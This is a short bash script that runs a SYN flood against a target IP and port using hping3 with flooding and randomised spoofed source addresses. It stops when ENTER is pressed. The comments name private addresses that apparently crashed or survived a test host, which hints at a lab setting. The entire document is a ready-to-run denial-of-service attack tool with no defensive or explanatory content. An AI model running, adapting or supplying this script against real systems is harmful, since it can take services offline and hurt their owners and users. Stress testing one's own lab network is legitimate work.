#!/bin/bash
# This may destroy the host. 10.20.2.254 crashed the host
# Only known safe address 10.20.4.254

TARGET="${1:?Usage: $0 <target_ip> [port]}"
PORT="${2:-80}"

echo "[*] Starting SYN flood -> $TARGET:$PORT"
echo "[*] Press ENTER to stop..."
echo ""

hping3 --syn --flood --rand-source -p "$PORT" "$TARGET" &
HPING_PID=$!

read -r

kill "$HPING_PID" 2>/dev/null
wait "$HPING_PID" 2>/dev/null

echo ""
echo "[*] Flood stopped."

# Observe on target watch -n 1 'ss -s'